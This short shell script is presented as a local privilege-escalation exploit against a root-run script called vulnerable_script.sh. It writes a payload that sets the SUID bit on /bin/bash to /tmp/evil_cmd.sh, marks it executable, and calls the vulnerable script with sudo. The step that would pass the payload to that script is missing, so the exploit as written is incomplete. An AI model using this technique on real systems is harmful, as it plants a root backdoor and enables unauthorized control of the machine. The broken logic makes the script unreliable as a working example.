# This script exploits the vulnerable_script.sh to gain root privileges.
# The vulnerability is that vulnerable_script.sh is run as root, and a regular user can modify its input.

# Create a temporary file with a command to execute as root.
echo "chmod +s /bin/bash" > /tmp/evil_cmd.sh
# Make it executable
chmod +x /tmp/evil_cmd.sh

# Replace the vulnerable input with our malicious script.
sudo ./vulnerable_script.sh
